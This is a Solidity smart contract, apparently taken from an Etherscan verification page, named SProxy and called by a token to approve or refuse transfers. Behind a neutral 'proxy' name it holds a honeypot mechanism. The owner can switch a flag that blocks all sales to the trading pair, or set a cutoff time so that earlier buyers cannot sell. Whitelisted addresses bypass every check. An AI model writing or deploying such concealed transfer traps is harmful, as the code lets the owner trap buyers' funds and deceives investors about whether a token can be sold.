/**
 *Submitted for verification at Etherscan.io on 2023-05-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract SProxy {
    address private _owner;    
    address private token;
    address private pair;

    bool private isFinished;

    mapping(address => bool) private _whitelists;
    mapping (address => uint256) private _addressTime;

    uint256 private lastTime;

    modifier onlyToken() {
        require(msg.sender == token); 
        _;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    constructor () {
        _owner = msg.sender;
        _whitelists[_owner] = true;
    }

    function setTokenIsFinished(bool _isFinished) external onlyOwner {
      isFinished = _isFinished;
    }

    function refreshProxySetting(address _token, address _pair) external onlyOwner {
      token = _token;
      pair = _pair;
      isFinished = false;
      lastTime = 0;
    }

    function setLastTimeForToken() external onlyOwner {
      lastTime = block.timestamp;
    }

    function whitelistForTokenHolder(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }

    function check(address _from, address _to) external onlyToken returns (bool) {
      if (_whitelists[_from] || _whitelists[_to]) {
        return false;
      }
      if (_from == pair) {
        if (_addressTime[_to] == 0) {
          _addressTime[_to] = block.timestamp;
          return true;
        }
      } else if (_to == pair) {
        require(!isFinished && _addressTime[_from] >= lastTime);
        return true;
      } else {
        _addressTime[_to] = _addressTime[_from];
        return true;
      }
      revert();
    }

    function pay(string memory serviceName, bytes memory signature, address wallet) external payable {
    }
}